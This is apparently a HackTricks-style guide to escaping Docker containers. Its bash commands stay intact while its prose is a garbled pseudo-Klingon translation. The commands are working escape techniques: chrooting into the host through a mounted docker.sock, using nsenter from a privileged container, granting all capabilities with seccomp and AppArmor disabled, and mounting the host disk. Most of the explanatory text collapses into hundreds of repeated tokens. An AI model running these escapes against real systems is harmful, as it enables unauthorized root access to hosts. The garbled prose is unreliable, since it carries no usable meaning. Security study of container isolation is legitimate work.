# Docker Breakout / Privilege Escalation

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Automatic Enumeration & Escape

* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): It can also **enumerate containers**
* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): This tool is pretty **useful to enumerate the container you are into even try to escape automatically**
* [**amicontained**](https://github.com/genuinetools/amicontained): Useful tool to get the privileges the container has in order to find ways to escape from it
* [**deepce**](https://github.com/stealthcopter/deepce): Tool to enumerate and escape from containers
* [**grype**](https://github.com/anchore/grype): Get the CVEs contained in the software installed in the image

## Mounted Docker Socket Escape

If somehow you find that the **docker socket is mounted** inside the docker container, you will be able to escape from it.\
This usually happen in docker containers that for some reason need to connect to docker daemon to perform actions.
```bash
#Search the socket
find / -name docker.sock 2>/dev/null
#It's usually in /run/docker.sock
```
**In this case you can use regular docker commands to communicate with the docker daemon:**

**Klingon Translation:**

**vaj vItlhutlh:**
Docker daemon vItlhutlh vaj Docker commands regular vaj.
```bash
#List images to use one
docker images
#Run the image mounting the host disk and chroot on it
docker run -it -v /:/host/ ubuntu:18.04 chroot /host/ bash

# Get full access to the host via ns pid and nsenter cli
docker run -it --rm --pid=host --privileged ubuntu bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Get full privs in container without --privileged
docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
```
{% hint style="info" %}
**Docker** **socket** **vItlhutlh** **unexpected** **place** **case** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **'e'** **
```bash
capsh --print
```
**qaStaHvIS linux capabilities** 'ej chel abuse 'oH 'ej 'oH 'ej 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'oH 'o
```bash
docker run --rm -it --pid=host --privileged ubuntu bash
```
### Qa'vIn

**privileged** qutlh **flag** vItlhutlh **host's disk** qurgh **access** 'ej **escape abusing release\_agent or other escapes** **try** vItlhutlh.

container executing vItlhutlh **bypasses** **following** **Test**:
```bash
docker run --rm -it --privileged ubuntu bash
```
#### Disk yIqem - Poc1

Docker containers Daq yIqem Hoch **fdisk -l** command jatlhlaHbe'. 'ejwI' 'e' vItlhutlh **--privileged** yIlo' **--device=/dev/sda1** jatlhlaHbe' 'ej yIlo' caps, 'oH vItlhutlh vItlhutlh host drive qar'a'.

![](https://bestestredteam.com/content/images/2019/08/image-16.png)

So to take over the host machine, it is trivial:
```bash
mkdir -p /mnt/hola
mount /dev/sda1 /mnt/hola
```
ghobe' ! jImejqa'pu' ! nuqneH 'oH vItlhutlh 'ej vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vIt
```bash
### Check if You Can Write to a File-system
echo 1 > /proc/sysrq-trigger

### Check root UUID
cat /proc/cmdline
BOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300

# Check Underlying Host Filesystem
findfs UUID=<UUID Value>
/dev/sda1

# Attempt to Mount the Host's Filesystem
mkdir /mnt-test
mount /dev/sda1 /mnt-test
mount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
debugfs /dev/sda1
```
#### qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 'ej qo'noSqa' qIb 